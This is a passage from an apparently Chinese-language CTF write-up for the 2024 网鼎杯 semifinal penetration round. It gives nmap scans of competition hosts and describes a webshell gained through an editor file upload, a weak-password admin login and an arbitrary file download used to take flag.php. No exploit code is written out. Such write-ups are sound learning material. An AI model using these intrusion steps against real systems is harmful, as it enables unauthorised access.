post-check=0, pre-check=0|     Content-Length: 9545|     Connection: close|     Content-Type: text/html; charset=UTF-8|     &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">&lt;html xmlns="http://www.w3.org/1999/xhtml">&lt;head>&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />&lt;meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, post-check=0, pre-check=0"/>&lt;meta http-equiv="Connection" content="Close"/>&lt;title>&amp;#x7F51;&amp;#x7AD9;&amp;#x9632;&amp;#x706B;&amp;#x5899;&lt;/title>&lt;style type="text/css">a,img,h1,body,p&#123; margin:0; padding:0; list-style:none; border:none;&#125;body&#123; font-family:|     font-size:12px; background:#fff;&#125;table&#123; margin: 0; padding: 0; width: 100%;&#125;a:hover, a:link,|   RTSPRequest: |     HTTP/1.1 400 Bad Request|     Date: Sat, 23 Nov 2024 02:52:36 GMT|     Server: wdb|     Content-Length: 226|     Connection: close|     Content-Type: text/html; charset=iso-8859-1|     &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">|     &lt;html>&lt;head>|     &lt;title>400 Bad Request&lt;/title>|     &lt;/head>&lt;body>|     &lt;h1>Bad Request&lt;/h1>|     &lt;p>Your browser sent a request that this server could not understand.&lt;br />|     &lt;/p>|_    &lt;/body>&lt;/html>110/tcp   open     tcpwrapped111/tcp   open     rpcbind    2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      32780/tcp   mountd|   100005  1,2,3      32780/tcp6  mountd|   100005  1,2,3      32780/udp   mountd|   100005  1,2,3      32780/udp6  mountd|   100021  1,3,4      32777/tcp   nlockmgr|   100021  1,3,4      32777/tcp6  nlockmgr|   100021  1,3,4      32777/udp   nlockmgr|   100021  1,3,4      32777/udp6  nlockmgr|   100024  1          32778/tcp   status|   100024  1          32778/tcp6  status|   100024  1          32778/udp   status|_  100024  1          32778/udp6  status514/tcp   filtered shell2049/tcp  open     nfs        3-4 (RPC #100003)7681/tcp  open     unknown| fingerprint-strings: |   GetRequest, HTTPOptions, RTSPRequest: |     HTTP/1.0 200 OK|     server: ttyd/1.6.3 (libwebsockets/4.2.1-09e6c20)|     content-type: text/html|     content-length: 464459|_    &lt;!DOCTYPE html>&lt;html lang="en">&lt;head>&lt;meta charset="UTF-8">&lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">&lt;title>ttyd - Terminal&lt;/title>&lt;link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vb8620/tcp  open     unknown| fingerprint-strings: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: |     HTTP/1.1 200 WebSocket|     Server: workerman/4.0.27|_    &lt;div style="text-align:center">&lt;h1>WebSocket&lt;/h1>&lt;hr>workerman/4.0.27&lt;/div>32777/tcp open     nlockmgr   1-4 (RPC #100021)32778/tcp open     status     1 (RPC #100024)32780/tcp open     mountd     1-3 (RPC #100005)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="编辑器getshell"><a href="#编辑器getshell" class="headerlink" title="编辑器getshell"></a>编辑器getshell</h2><p>通过信息收集发现 admin 模块下存在一个 shop action，是个编辑器，可以文件上传</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203163218111.png" alt="image-20241203163218111"></p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203163253822.png" alt="image-20241203163253822"></p><p>rce函数都被禁用,但是 file_get_contents 以及 readfile 等读取函数没有被禁用，于是可以拿到 flag</p><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>通过文件读取读到数据库的配置，获取到账密</p><p>反正 getshell 了，蚁剑连上去，用php连接数据库应该也不是什么问题</p><hr><h1 id="云支付-114-114-114-229-44514"><a href="#云支付-114-114-114-229-44514" class="headerlink" title="云支付-114.114.114.229:44514"></a>云支付-114.114.114.229:44514</h1><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203151625344.png" alt="image-20241203151625344"></p><h2 id="扫描-2"><a href="#扫描-2" class="headerlink" title="扫描"></a>扫描</h2><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/db76b484-1d8e-403a-93e9-f69d3dff6ede.png" alt="db76b484-1d8e-403a-93e9-f69d3dff6ede"></p><p>存在flag.php，可以尝试找个文件读取</p><p>访问 admin 下的所有文件都会被重定向到 admin&#x2F;login.php</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">PORT      STATE SERVICE    VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open  tcpwrapped80/tcp    open  http       nginx|_http-title: \xE6\xB2\xA1\xE6\x9C\x89\xE6\x89\xBE\xE5\x88\xB0\xE7\xAB\x99\xE7\x82\xB9110/tcp   open  tcpwrapped111/tcp   open  rpcbind    2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      32780/tcp   mountd|   100005  1,2,3      32780/tcp6  mountd|   100005  1,2,3      32780/udp   mountd|   100005  1,2,3      32780/udp6  mountd|   100021  1,3,4      32777/tcp   nlockmgr|   100021  1,3,4      32777/tcp6  nlockmgr|   100021  1,3,4      32777/udp   nlockmgr|   100021  1,3,4      32777/udp6  nlockmgr|   100024  1          32778/tcp   status|   100024  1          32778/tcp6  status|   100024  1          32778/udp   status|_  100024  1          32778/udp6  status2049/tcp  open  nfs        3-4 (RPC #100003)7681/tcp  open  unknown| fingerprint-strings: |   GetRequest, HTTPOptions, RTSPRequest: |     HTTP/1.0 200 OK|     server: ttyd/1.6.3 (libwebsockets/4.2.1-09e6c20)|     content-type: text/html|     content-length: 464459|_    &lt;!DOCTYPE html>&lt;html lang="en">&lt;head>&lt;meta charset="UTF-8">&lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">&lt;title>ttyd - Terminal&lt;/title>&lt;link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vb8620/tcp  open  unknown| fingerprint-strings: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: |     HTTP/1.1 200 WebSocket|     Server: workerman/4.0.27|_    &lt;div style="text-align:center">&lt;h1>WebSocket&lt;/h1>&lt;hr>workerman/4.0.27&lt;/div>32777/tcp open  nlockmgr   1-4 (RPC #100021)32778/tcp open  status     1 (RPC #100024)32780/tcp open  mountd     1-3 (RPC #100005)44514/tcp open  http       Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)|_http-title: \xE4\xBA\x91\xE6\x94\xAF\xE4\xBB\x98 - \xE4\xB8\x93\xE6\xB3\xA8\xE5\x85\x8D\xE7\xAD\xBE\xE7\xBA\xA6\xE8\xAE\xA9\xE6\x94\xAF\xE4\xBB\x98\xE5\xAF\xB9\xE6\x8E\xA5\xE6\x9B\xB4\xE7\xAE\x80\xE5\x8D\x95\xEF\xBC\x81| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7681端口是个终端，应该是主办方用来管理容器的</p><p>尝试爆破弱密码失败</p><h2 id="本应成功的后台弱密码登录（😡）"><a href="#本应成功的后台弱密码登录（😡）" class="headerlink" title="本应成功的后台弱密码登录（😡）"></a>本应成功的后台弱密码登录（😡）</h2><p>然后呢，然后尝试拿下面的联系方式作为密码登录admin</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203152803529.png" alt="image-20241203152803529"></p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203152833405.png" alt="image-20241203152833405"></p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203152847462.png" alt="image-20241203152847462"></p><p>？？？赛后看别人的wp和我录屏的时候发现正解就是这个啊</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203160722494.png" alt="image-20241203160722494"></p><p>唉草台班子</p><p>后台插件下载这里存在任意文件下载，把flag.php下下来就行（我说admin下面放个几b的php.zip干什么）</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203162119216.png" alt="image-20241203162119216"></p><h2 id="未能拿到的前台商户key"><a href="#未能拿到的前台商户key" class="headerlink" title="未能拿到的前台商户key"></a>未能拿到的前台商户key</h2><p>进去的话就能拿到商户的key</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203161914233.png" alt="image-20241203161914233"></p><p>然后去前台登录商户，在官方公告处得到flag</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203161959514.png" alt="image-20241203161959514"></p><hr><h1 id="客服系统-114-114-114-20"><a href="#客服系统-114-114-114-20" class="headerlink" title="客服系统-114.114.114.20"></a>客服系统-114.114.114.20</h1><p>从云支付右边的弹窗进客服系统</p><p>和蓝帽杯决赛一样的客服系统啊，莫非是蓝帽魅力时刻…布豪，客服不读我的xss！</p><p>欧内该，不读xss的话，瓦塔西！客服很不高兴为我服务😡</p><p>客服：<a href="http://114.114.114.20:41451/welive.php?a=6168&group=1&url=aHR0cDovLzExNC4xMTQuMTE0LjIyOTo0NDUxNC8=">http://114.114.114.20:41451/welive.php?a=6168&amp;group=1&amp;url=aHR0cDovLzExNC4xMTQuMTE0LjIyOTo0NDUxNC8=</a></p><p>后台：<a href="http://114.114.114.20:51451/">http://114.114.114.20:51451</a></p><h2 id="扫描-3"><a href="#扫描-3" class="headerlink" title="扫描"></a>扫描</h2><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203163642001.png" alt="image-20241203163642001"></p><hr><h1 id="254-端口扫描"><a href="#254-端口扫描" class="headerlink" title="254 端口扫描"></a>254 端口扫描</h1><pre class="line-numbers language-none"><code class="language-none">PORT      STATE SERVICE    VERSION53&#x2F;tcp    open  tcpwrapped80&#x2F;tcp    open  http       nginx|_http-title: \xE6\xB2\xA1\xE6\x9C\x89\xE6\x89\xBE\xE5\x88\xB0\xE7\xAB\x99\xE7\x82\xB9111&#x2F;tcp   open  rpcbind    2-4 (RPC #100000)| rpcinfo: |   program version    port&#x2F;proto  service|   100000  2,3,4        111&#x2F;tcp   rpcbind|   100000  2,3,4        111&#x2F;udp   rpcbind|   100000  3,4          111&#x2F;tcp6  rpcbind|   100000  3,4          111&#x2F;udp6  rpcbind|   100003  3,4         2049&#x2F;tcp   nfs|   100003  3,4         2049&#x2F;tcp6  nfs|   100005  1,2,3      32780&#x2F;tcp   mountd|   100005  1,2,3      32780&#x2F;tcp6  mountd|   100005  1,2,3      32780&#x2F;udp   mountd|   100005  1,2,3      32780&#x2F;udp6  mountd|   100021  1,3,4      32777&#x2F;tcp   nlockmgr|   100021  1,3,4      32777&#x2F;tcp6  nlockmgr|   100021  1,3,4      32777&#x2F;udp   nlockmgr|   100021  1,3,4      32777&#x2F;udp6  nlockmgr|   100024  1          32778&#x2F;tcp   status|   100024  1          32778&#x2F;tcp6  status|   100024  1          32778&#x2F;udp   status|_  100024  1          32778&#x2F;udp6  status2049&#x2F;tcp  open  nfs        3-4 (RPC #100003)32777&#x2F;tcp open  nlockmgr   1-4 (RPC #100021)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;谁偷走了我的云支付首页手机号弱密码登录！&lt;/p&gt;
&lt;p&gt;ctf没有web，&lt;del&gt;渗透还寄了&lt;/del&gt;，可惜队友安全运营一个第3一个第8了，遗憾退场&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://blog.csdn.net/qq_30817059/article/details/144030914#t5&quot;&gt;https://blog.csdn.net/qq_30817059/article/details/144030914#t5&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="线下赛" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
